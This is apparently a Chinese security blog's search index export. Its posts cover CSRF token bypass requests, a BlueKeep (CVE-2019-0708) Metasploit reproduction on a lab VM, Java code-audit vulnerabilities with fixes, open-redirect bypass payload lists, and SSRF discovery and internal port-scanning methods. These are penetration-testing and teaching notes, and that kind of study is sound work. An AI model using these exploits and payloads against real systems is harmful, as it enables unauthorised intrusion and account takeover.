<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[绕过CSRF防御总结]]></title>
    <url>%2F2019%2F09%2F19%2F%E7%BB%95%E8%BF%87CSRF%E9%98%B2%E5%BE%A1%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[一、 先了解下CSRF_TOKEN1. 什么是CSRF_TOKEN 就是防止跨站请求伪造（CSRF）的 2. 什么CSRF-Token可以写在COOKIE里 将csrf令牌写入Cookie，是因为：服务器进行csrf防御校验的时候，是拿用户http请求体中的token参数值和cookie中的csrftoken值进行比对。如果值一样了，操作才被允许执行。 因为同源策略的限制，当正常用户通过账号密码等方式登陆网站A后，在不注销账号或当前COOKIE失效之前，再次访问网站A时（协议、IP、端口号相同则属于同源）浏览器会自动在HTTP请求包中带上该网站用户登陆后的COOKIE信息。 也就是说我们对CSRF的理解应为：攻击者借用用户COOKIE执行非用户本意的操作。 在此攻击过程中用户COOKIE对于攻击者来说是不可见的是未知的、不可见的，攻击者能做到仅仅是借用COOKIE，而COOKIE里面具体写了什么，攻击者是不知道的。又因为COOKIE里的信息对于攻击者来说是不可预知的，无法伪造的，所以将CSRF-TOKEN写在COOKIE中符合就CSRF防御思想中的不可预知原则。 3. 常见csrf_token使用方式有两种：3.1 Synchronizer token pattern(STP) 对于每个request，在服务器端生成一个新的csrf_token，并将其返回在页面的表单中。在服务器端每次接收到请求时，都会验证表单中是否包含正确的csrf_token。由于第三方网站无法得知正确的csrf_token，所以无法进行csrf攻击。 1234567get_token = get_random_token() return &#123; &lt;form&gt; &lt;input name=field1&gt;&lt;/input&gt; &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=#&#123;get_token()&#125; /&gt; &lt;/form&gt;&#125; 这个方法的好处是客户端不需要支持javascript，因此通用于所有的网站。坏处是由于服务器端对于每个请求都会更换csrf_token，因此他需要保证用户提交的表单是用户最近一次请求的表单。如果用户通过多个tab同时浏览该网站，那么往往会导致用户提交的表单不是最新的那一个。 3.2 Cookie-to-header token 第二个方法是为每个session生成一个csrf_token，随后将csrf_token保存到cookie中，之后通过javascript在每次请求时将csrf_token设置到http header中的X-Csrf-Token属性中。再在服务器端比较Cookie的csrf_token与header中的token是否一致。 12345//当用户登录时设置CookieSet-Cookie: Csrf-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=///当用户发送请求时设置Http Header中的X-Csrf-TokenX-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql 二、绕过CSRF防御总结 注：原文链接：https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee（需要科学上网） CSRF漏洞很容易就可以被发现并利用。一眼看去很多站点好像在这方面都做得不错：当你检查针对敏感操作的请求时，他们往往会实施CSRF保护。有时候可能是一个在请求主体中的CSRF token，也有可能是一个referer字段检测，或者有时是一个特殊的HTTP头字段或者cookie字段。 但是CSRF的防御不代表它就不可以被绕过。今天我们讨论一些我如何绕过CSRF防御措施的技术。 2.1 所有的CSRF 不管哪种CSRF防御措施部署，你都可以先尝试如下两件事：点击劫持和更改请求方法。 2.1.1 点击劫持 在同一个功能端点利用点击劫持会绕过所有CSRF防御。因为从技术上讲，请求确实来自合法站点，如果易受攻击的端点所在页面容易遭受点击劫持攻击，那么所有的CSRF保护将变得没有效果，攻击者可以任意执行CSRF攻击。 2.1.2 更改请求方法 另外值得一试的方法就是更改请求的方法。如果要伪造的敏感请求是通过POST方法发送的，那么尝试将其转换为GET请求。如果操作时通过GET方法发送的，那么尝试转换为POST方法。应用程序可能仍然执行操作，且通常没有任何保护机制。 例如，如下请求： 123456POST /change_passwordPOST body:new_password=qwerty可以被改写成GET /change_password?new_password=qwerty 三 、CSRF token的防御措施 因为一个站点使用了CSRF token不代表这个token是有效验证对应请求操作的，可以尝试如下方法绕过CSRF的token保护。 3.1 删除token参数或发送空token 不发送token也可以正常请求数据是因为这种逻辑错误在应用程序中非常常见：应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的。 例如，合法请求如下 12345678910111213POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b那么实施这种请求：POST /change_passwordPOST body:new_password=qwerty或这种：POST /change_passwordPOST body:new_password=qwerty&amp;csrf_tok= 3.2 使用另一个session的CSRF token 应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。如果是这种情况的话，你可以在payload中硬编码一个合法有效的token即可。 如果一个受害者的token是871caef0757a4ac9691aceb9aad8b65b，你自己的token是YOUR_TOKEN，那么你可以很容易获取到自己的token但很难获取到受害者的token。尝试在payload中提供自己的token来绕过CSRF防御。 换句话说，原本应该发送如下请求： 12345678POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b但是改成发送这个请求：POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=YOUR_TOKEN 3.3 Session固定 有时候站点使用一个双提交cookie作为一个CSRF的防御措施。这个表明这个请求需要包含一个cookie，其值为随机token值，且同时在请求参数中也有一个字段值为该随机token值。如果值相同，那么请求是合法的。这种防御形式是非常常见的。 如果一个双提交cookie用在了防御措施中，那么这个应用有可能没有将有效的token保存在服务器端。所以它没有办法指定token是否合法，并且也有可能很少检查cookie中的token值和参数中token值是不是一样的。这代表你可以发送一个假token，然后仍然可以有效实施CSRF攻击。 这种攻击包含两个步骤：第一步，你使用一个session固定技术去确认受害者的浏览器使用的是你提供的包含假token的session，然后第二步在参数中使用同一个token来执行这个CSRF攻击。 session固定。这是一个可以让你控制受害者的cookie存储的攻击； 123456执行如下请求来实施CSRF攻击POST /change_passwordCookie: CSRF_TOK=FAKE_TOKEN;POST body:new_password=qwerty &amp;csrf_tok=FAKE_TOKEN 3.4 通过XSS获取csrf_token 前提是网站不存在XSS漏洞或者CSRF-Token具备httponly属性 3.5 Jsonp劫持获取csrf_token https://www.jianshu.com/p/1cda296cf7d2 四、 Referer字段的CSRF防御 如果attack.com是一个可控的域名，bank.com是一个要攻击的域名。这个站点没有使用CSRF token但是检查了referer字段。你应该怎么做？ 4.1 Referer值为空或移除referer字段 首先，我们对空Referer的定义为，Referer 头部的内容为空，或者，一个HTTP请求中根本不包含Referer头部 和发送一个空token值相同，有时候你只需简单地移除referer字段就可以绕过CSRF防御。你可以添加如下meta标签到存在漏洞的页面。 扩展测试面：例如jsonp劫持 123&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;或&lt;meta name =&quot;referrer&quot; content =&quot;no-referrer&quot;&gt; 应用程序可能只是在发送后才会验证，这种情况下你可以绕过其CSRF防御。 4.2 绕过正则表达式 如果referer检查是基于白名单的，你可以尝试绕过验证URL的正则表达式。例如，你可以尝试在referer的URL中将受害者域名置于二级域名区域或者URL目录区域。 如果一个站点在referer字段检查“bank.com”字段，那么“bank.com.attacker.com”或”attakcer.com/bank.com”可能可以绕过这种检测。]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>前端安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-0708 远程桌面代码执行漏洞复现]]></title>
    <url>%2F2019%2F09%2F07%2FCVE-2019-0708%2F</url>
    <content type="text"><![CDATA[0X00 简介 Microsoft Windows是美国微软公司发布的视窗操作系统。远程桌面连接是微软从Windows 2000 Server开始提供的功能组件。 2019年5月14日，微软发布了月度安全更新补丁，修复了远程桌面协议（RDP）远程代码执行漏洞。未经身份验证的攻击者利用该漏洞，向目标 Windows主机发送恶意构造请求，可以在目标系统上执行任意代码。 近日，Metasploit发布了该漏洞的利用模块，GitHub网站上也公开了该漏洞的利用代码，引起了安全研究人员的广泛关注。目前该漏洞利用仅对Windows 7 SP1 x64与Windows 2008 R2 x64（非系统默认配置）系统版本有效，在虚拟机环境下复现成功。 0X01 环境准备 攻击机:kali 靶机：Win7 12Windows7 SP1下载链接ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/ 0x02 漏洞复现 msf必须使用msf5（#msfupdate） 下载exp:kali攻击机下载metasploit攻击脚本，kali中执行以下命令 1234wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb 图：下载攻击载荷 做如下替换（大部分人msf都装在如下位置） 12345678rdp.rb -&gt; /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rbrdp_scanner.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcve_2019_0708_bluekeep.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb 做如下替换（我的位置） 12345678rdp.rb -&gt; /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rbrdp_scanner.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcve_2019_0708_bluekeep.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb reload_all 重新加载所有的模块，将新添加的模块加载上。成功如下图： 图：成功加载攻击载荷 使用攻击载荷 1234&gt; use exploit/rdp/cve_2019_0708_bluekeep_rce&gt; set rhosts 靶机IP&gt; set target 3 （根据靶机而定）&gt; exploit 成功利用！！！！ 1&gt; set target 3 图：蓝屏 再来一次！！！！ 1&gt; set target 1 图：会话 0x03 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具 下载页面： 1https://www.qianxin.com/other/CVE-2019-0708 使用说明： 12345&gt;下载文件进行解压。&gt;使用win+R快捷键或开始菜单选择“运行”，输入cmd。调起命令行工具。&gt;在命令行工具，执行命令到工具所在文件夹&gt;输入命令对应功能，启用热补丁命令：QKShield.exe /enable ；禁用热补丁命令：QKShield.exe/disable 。&gt;重启系统后，需要重新运行命令行来启用热补丁 实现效果： 123456789101112131415在工具支持的系统中启用热补丁后，用漏洞扫描工具扫描结果为没有漏洞。漏洞扫描工具下载地址：https://www.qianxin.com/other/CVE-2019-0708支持系统：Windows XP for 32-bit Systems Service Pack 3Windows 7 for 32-bit SystemsWindows 7 for x64-based SystemsWindows 7 for 32-bit Systems Service Pack 1Windows 7 for x64-based Systems Service Pack 1Windows Server 2003 for 32-bit Systems Service Pack 2Windows Server 2003 R2 for 32-bit Systems Service Pack2Windows Server 2008 for 32-bit Systems Service Pack 2Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)Windows Server 2008 for x64-based Systems Service Pack2Windows Server 2008 for x64-based Systems Service Pack2 (Server Core installation)Windows Server 2008 R2 for x64-based Systems ServicePack 1Windows Server 2008 R2 for x64-based Systems ServicePack 1 (Server Core installation) 暂不支持的系统： 123Windows Server 2003 for x64-based Systems Service Pack2Windows Server 2008 for Itanium-Based Systems ServicePack 2Windows Server 2008 R2 for Itanium-Based SystemsService Pack 1]]></content>
      <categories>
        <category>CVE-2019</category>
      </categories>
      <tags>
        <tag>CVE-2019-0708</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Insecure Randomness]]></title>
    <url>%2F2019%2F08%2F22%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Insecure%20Randomness%2F</url>
    <content type="text"><![CDATA[1、Insecure Randomness1.1、描述： 伪随机数生成器（PRNG）使用确定性数学算法来产生具有良好统计属性的数字序列。但是这种数字序列并不具有真正的随机特性。伪随机数生成器通常以一个算术种子值为起始。算法使用该种子值生成一个输出以及一个新的种子，这个种子又被用来生成下一个随机值，以此类推。Java API 提供了伪随机数生成器（PRNG）—— java.util.Random类。这个伪随机数生成器具有可移植性和可重复性。因此，如果两个java.util.Random类的实例创建时使用的是相同的种子值，那么对于所有的Java实现，它们将生成相同的数字序列。在系统重启或应用程序初始化时，Seed值总是被重复使用。在一些其他情况下，seed值来自系统时钟的当前时间。攻击者可以在系统的一些安全脆弱点上监听，并构建相应的查询表预测将要使用的seed值。 1.2、审计方法： 全局搜索以下关键词 “random” 1.3、漏洞示例: 例如在易于猜测的密码、可预测的加密密钥、验证码生成、抽奖活动、UUID生成、SessionID生成、Token生成、CSRF Token、找回密码Token、游戏（随机元素的生成）、密码应用场景、生成密钥：对称密码，消息认证、生成密钥对：公钥密码，数字签名、生成IV： 用于分组密码的CBC，CFB和OFB模式、生成nonce: 用于防御重放攻击; 分组密码的CTR模式、生成盐：用于基于口令的密码PBE等，可能会降低系统安全性。 图1：漏洞代码 1.4、漏洞危害： 生成的随机数很容易预测，可能会降低系统安全性。 1.5、修复方案： 因此，java.util.Random类不能用于安全敏感应用或者敏感数据保护。应使用更加安全的随机数生成器，例如java.security.SecureRandom类。 图2：修复代码]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Java代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[敏感信息硬编码在程序中]]></title>
    <url>%2F2019%2F08%2F22%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%A1%AC%E7%BC%96%E7%A0%81%E5%9C%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%2F</url>
    <content type="text"><![CDATA[1、敏感信息硬编码在程序中1.1、描述： 如果将敏感信息（包括口令和加密密钥）硬编码在程序中，可能会将敏感信息暴露给攻击者。任何能够访问到class文件的人都可以反编译class文件并发现这些敏感信息。因此，不能将信息硬编码在程序中。同时，硬编码敏感信息会增加代码管理和维护的难度。 1.2、审计方法： 全局搜索以下关键词 “password” 1.3、漏洞示例: 恶意用户可以使用javap -c IPaddress命令来反编译class来发现其中硬编码的服务器IP地址。反编译器的输出信息透露了服务器的明文IP地址：172.16.254.1。 图1：错误代码 1.4、漏洞危害： 很容易被攻击者利用，导致系统敏感信息泄露。 1.5、修复方案： 敏感信息存放在配置文件或数据库中并加密存储。(金融行业安全系数更高) 这个正确代码示例从一个安全目录下的外部文件获取服务器IP地址。并在其使用完后立即从内存中将其清除可以防止后续的信息泄露。 图2：正确代码]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Java代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Null Dereference]]></title>
    <url>%2F2019%2F08%2F20%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Null%20Dereference%2F</url>
    <content type="text"><![CDATA[1、Null Dereference（空指针异常）1.1、产生原因： 当违反程序员的一个或多个假设时，通常会出现 null 指针异常。如果程序明确将对象设置为null，但稍后却间接引用该对象，则将出现 dereference-after-store 错误。此错误通常是因为程序员在声明变量时将变量初始化为 null。大部分空指针问题只会引起一般的软件可靠性问题，但如果攻击者能够故意触发空指针间接引用，攻击者就有可能利用引发的异常绕过安全逻辑，或致使应用程序泄漏调试信息，这些信息对于规划随后的攻击十分有用。 示例：在下列代码中，程序员将变量 foo 明确设置为 null。稍后，程序员间接引用 foo，而未检查对象是否为 null 值。 图1：引起Null Dereference漏洞的代码 2.2、修复方案： 在间接引用可能为 null 值的对象之前，请务必仔细检查。如有可能，在处理资源的代码周围的包装器中纳入 null 检查，确保在所有情况下均会执行 null 检查，并最大限度地减少出错的地方。 图2：修复Null Dereference漏洞后的代码]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Java代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[任意文件读取]]></title>
    <url>%2F2019%2F08%2F19%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%2F</url>
    <content type="text"><![CDATA[1、Any File Read（任意文件读取）1.1、描述： 任意文件读取漏洞（Unrestricted File Upload），是一种常见的Web安全漏洞，因Web程序提供的文件查看下载、附件下载等功能存在安全缺陷，导致通过修改文件路径就能够查看和下载任意文件，这些文件包括：源代码文件、系统文件（/etc/passwd、C:/boot.ini等）、配置文件（config.php、/WEB-INF/web.xml、web.config等），造成网站敏感信息泄露，严重危害网站安全。 1.2、审计方法： 全局搜索以下关键词: “fileName”, “filePath”, “getFile”, “getWriter”, “MultipartFile”, “createNewFile”, “FileInputStream” 1.3、漏洞示例: 代码在 downloadFile()函数中获取请求参数中的affixalName的值，然后赋值给 FileName 变量，接着在 196 行处通过拼接字符串赋值给downPath 变量，然后在 198 行处调用 download 函数并把 downPath 的值传进函数，download 函数的代码如下: 图1：漏洞代码 download 函数把 filePath 处的文件写到 http 响应中，在整个流程中并没有对文件名的合法 性进行检查，存在任意文件下载漏洞，如通过把 affixalName 的值设置 为../../../WEB-INF/web.xml 可以下载网站的 web.xml 文件。 图2：漏洞代码 图3：漏洞代码 1.3、漏洞危害: 任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取的配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。 1.4、修复方案： 指定下载路径以防止用户读取和下载指定目录以外的文件。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Java代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何绕过URL限制]]></title>
    <url>%2F2019%2F07%2F20%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87URL%E9%99%90%E5%88%B6%2F</url>
    <content type="text"><![CDATA[1、如何绕过URL限制1.1、描述： URL重定向漏洞（URL redirection vulnerability），是一种常见的Web安全漏洞，由于网站URL重定向功能设计不当，没有验证跳转的目标URL是否合法，用户可通过此漏洞跳转到任意网站，这会导致可通过该网站跳转到存在木马、病毒的网站或者钓鱼网站，损害网站用户权利、网站名誉。 1.2、正常思路： 就是直接替换后面的URL来检测是否存在任意URL跳转，如果不存在，就直接返回到它自己的域名，如果存在，就跳转到你指定的URL 1.3、payload：123456789101112- ///www.baidu.com/%2f%2e%2e- /https://%5cbaidu.com/- //www.baidu.com- /www.baidu.com- https://www.google.com/www.baidu.com- /%2Fbaidu%252Ecom- http://www.google.com\.baidu.com- http://www.google.com\@baidu.com- http://www.google.com\#baidu.com- http://www.google.com\?baidu.com- http://www.google.com\\baidu.com- http://www.google.com\baidu.com: 1.4、Bypass0x01 利用问号绕过限制 利用问号，这是一个特性，利用问号可以成功绕过URL限制比如：http://www.aaa.com/acb?Url=http://login.aaa.com 这是一个跳转链接，跳转到它的二级域名下，那么这个问号放哪里可以绕过呢？其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：http://www.aaa.com/acb?Url=http://test.com?login.aaa.com 那么，它其实是会跳转到这个test.com域名下，这个域名是我想要跳转的任意域名，而后面的它自身域名一定要带上，不带上就无法辅助用问号?这个特性来跳转到指定域名了，而跳转后，问号和问号后面的内容会变为这样：http://www.test.com/?login.aaa.com 1payload：http://www.test.com/abc？url=http//payload.com?test1.com 0x02 利用反斜杠和正斜杠绕过限制 比如：http://www.aaa.com/acb?Url=http://login.aaa.com/ 同样是在它本身域名前加上正斜杠，然后正斜杠前面跟上你想跳转的域名地址。如：http://www.aaa.com/acb?Url=http://test.com/login.aaa.com反斜杠有三种思路两个反斜杠绕过方法比如：http://www.aaa.com/acb?Url=http://login.aaa.com/ 同样是在它本身域名前加上两个反斜杠，然后两个反斜杠前面跟上你想跳转的域名地址。如：http://www.aaa.com/acb?Url=http://test.com\login.aaa.com一个反斜杠绕过方法如：http://www.aaa.com/acb?Url=http://test.comlogin.aaa.com另一种思路，一个反斜杠一个点利用.这样的格式，也就是一个反斜杠加一个点来跳过限制，如：http://www.aaa.com/acb?Url=http://test.com.login.aaa.com 1payload：/ \ . 0x03 利用@绕过URL限制 如果你用这方法在火狐里进行跳转，会有弹窗提示，在其它游览器则没有。如：&lt;a href=”http://www.aaa.com/acb?Url=http://login.aaa.com@test.com“”&gt;http://www.aaa.com/acb?Url=http://login.aaa.com@test.com 后面的test.com就是要跳转到的域名，前面的域名都是用来辅助以绕过限制的。 1payload：@ 0x04 利用白名单缺陷绕过限制 有的域名白名单限制是不全的，比如如果想利用一个跳转，而这个跳转是通用，在这个公司网站很多子域名等都可以跳转，那么你买个域名也不算贵对吧。为什么这么说呢，这个问题就是白名单限制不当，比如，当跳转的域名包含这个网站下的所有域名，比如：http://www.aaa.com/acb?Url=http://login.aaa.com这个login.aaa.com也可以改成aaa.com同样可以跳转对吧，因为白名单里只要有包含这个域名就直接成功跳转。那么当我在这个域名前面加上如testaaa.com，白名单里会检查是否包含aaa.com这个域名，如果包含，就直接跳转，而并没有检查这个域名的整个信息，然后可以利用这个问题，直接注册一个testaaa.com这个域名就可以利用这个跳转。 1Payload:testaaa.com 0x05 多重验证&amp;跳转绕过限制 现在很多网站都有多重验证，比如你登陆账户后会出现另一个验证页面，输入手机验证码进行验证，此时这上面的URL很可能存在任意跳转的问题。多重跳转的问题导致可绕过URL限制比如http://www.aaa.com/acb?Url=http: … ttp://login.aaa.com当然，还有多重的，这个结构的多重跳转你修改最后面的URL就可以达到任意URL跳转，中间的URL就没必要动了。 0x06 点击触发达到绕过URL跳转限制 比如很多登陆页面的地方，其URL是一个跳转的URL如：http://www.aaa.com/acb?Url=http://test.com你直接修改了后面为任意URL，但是还是停留在原地，似乎没什么问题，但是，当你输入账号和密码后点击登陆按钮后，就会触发跳转。当然，这个账户和密码不一定要对的，随便都可以，但得视系统而定吧。这个我遇到了很多，比如你修改了域名，然后点击登陆，登陆成功后便可触发跳转，这也是一个比较隐蔽的绕过URL限制的跳转。 0x07 利用xip.io绕过 这个我还没有在测试中应用过，其请求是http://www.127.0.0.1.xip.io 这个绕过是在SSRF场景中的绕过，比如SSRF你要读取内网地址，一般都做了限制，可以尝试用这方法进行绕过限制，从而访问到内网。另外一点，URL跳转涉及的安全问题大家常见的就是钓鱼，那么利用这个思路也可达成一个钓鱼问题，如，http://www.qq.com.127.0.0.1.xip.io当你访问qq这个域名时，其实这个链接已经被解析到后面这个ip地址上了，那么实际访问的就是后面这个IP地址。 0x08 利用超链接绕过可信站点限制 比如一个URL，它是可以直接跳转的，但是一般测试跳转时大家习惯用www.baidu.com或qq.com这样的可信站点进行测试，但是有些网站是可以跳转这些网站的。只要是可信站点且常用，基本都可以跳转，那么这就属于正常的业务逻辑了，难度/Users/vk/Documents/Secure/Blog/content/post/代码审计-任意文件读取.md就这样错失一个URL跳转漏洞了？其实不然，只要你的URL被百度收录过，那么直接搜索你的域名，site:xxx.xxx因为你在百度里点击你的域名，它会先是一个302跳转，而这个302跳转就是百度下的302跳转，那么这样就可以绕过可信站点的限制，从而达到跳转到指定URL。当然，百度这个302有点长，你给它进行加密就行。 0x09 POST参数中的URL跳转 当然，这个影响就很小了，比如当你填什么表格或者需要填写什么的，当你上传图片，点击下一步的时候，通常下一步就是预览你填写的信息，最后才是提交。当你上传了图片后点击下一步抓包，如果过滤不严，你会看到图片的完整地址包含在POST参数里，你就可以直接修改这个地址为任意URL，然后到达下一步。这时是确定信息也就是预览自己填写的信息的正确还是不正确，由于你刚刚修改了图片地址，这里是没有显示出来的，图像会是一个小XX。当点击图片右键选择查看图像时，就会触发URL跳转问题，其实这个也可以利用来进行钓鱼，钓后台审核员的信息。为什么呢，比如审核看到图片无法加载，一般都会点击查看图片，然后跳转，如果安全意识不知就会造成安全影响。当然，如果POST参数里就只是URL跳转参数，那么你可以给它转成GET方式，然后进行跳转就可以了，只要网站支持这样的GET方式就行。在Burp Suite里可以一键转换提交方式，右键选择Change request method就可以！ 0x10 利用#号绕过 如：http://www.aaa.com/acb?Url=http://test.com#login.aaa.com 0x09 FUZZ 重定向Payloads by @cujanovichttps://github.com/cujanovic/Open-Redirect-Payloads 重定向参数 by @fuzzdb-projecthttps://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>WEB渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF绕过的方法]]></title>
    <url>%2F2019%2F07%2F19%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SSRF%E7%BB%95%E8%BF%87%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1、SSRF1.1、描述： SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 1.2、漏洞寻找： 分享功能，通过 URL 地址分享网页内容 早期分享应用中，为了更好的提供用户体验，WEB应用在分享功能中，通常会获取目标URL地址网页内容中的标签或者标签中content的文本内容作为显示以提供更好的用户体验 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览 由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务 在线翻译：通过URL地址翻译对应文本的内容。 提供此功能的国内公司有百度、有道等 图片加载与下载：通过URL地址加载或下载图片 图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。（开发者为了有更好的用户体验通常对图片做些微小调整例如加水印、压缩等，所以就可能造成SSRF问题） 图片、文章收藏功能 此处的图片、文章收藏中的文章收藏就类似于功能一、分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载 未公开的api实现以及其他调用URL的功能 此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。 数据库内置功能：数据库的比如mongodb的copyDatabase函数 邮件系统：比如接收邮件服务器地址 编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等 未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞 一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain…… 从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php） web钩子：寻找触发特定事件时发出http请求的服务。在大多数web钩子的功能中，终端用户可以选择他们的终端点和主机名。尝试向内部服务发送http请求。 文档解析器：尝试了解文档是如何被解析的。如果是XML文档，那就是用了PDF生成器方法。对于其他文档，检查是否存在引用外部资源的方法然后通过服务器向内部服务发送请求。 链接扩展: 最近Mark Litchfield在推特扩展链接上发现了漏洞，名声大涨。 文件上传：与常规上传文件相反，尝试发送url请求然后检查是否下载了url的内容。例子 PDF生成器：试着注入指向内部服务的&lt;iframe&gt;&lt;img&gt;,&lt;base&gt;或者&lt;script&gt;元素或者CSS的url()函数。 1.3 漏洞验证 排除法：浏览器f12查看源代码看是否是在本地进行了请求 1比如：该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞 dnslog等工具进行测试，看是否被访问 1可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。 抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址 12从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址通过二级域名暴力猜解工具模糊猜测内网地址 直接返回的Banner、title、content等信息 留意bool型SSRF 1.4 利用方式 让服务端去访问相应的网址 让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms 可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件 攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}） 攻击内网应用程序（利用跨协议通信技术） 判断内网主机是否存活：方法是访问看是否有端口开放 ​- 某些时候SSRF漏洞可以用作局域网内的端口扫描。这有助于理清内网的基础设施轮廓和并为下一步其他漏洞的利用做铺垫。上述这种情况通常是最简单的blind SSRF了。如果之前的脚本无法建立连接或收不到服务器响应，异常将被抛出。利用这个特征可以识别端口是否开放（连接建立）或关闭（连接失败或超时）。 12345URL parameter Response HTTP status RTT Conclusionhttp://127.0.0.1:22 200 10ms Port is openhttp://127.0.0.1:23 500 10ms Port is closedhttp://10.0.0.1/ 500 30010ms Firewalled or unable to route traffic to serverhttp://10.0.0.1:8080/ 500 10ms Port is closed and traffic is routed to server 对于开放和关闭的端口，每个SSRF响应都不同。试着以不同的响应为基础建立一个开放、闭合端口和标志符之间的映射。上面的表格就是一个例子。 DoS攻击（请求大文件，始终保持连接keep-alive always） 提取EC2配置文件 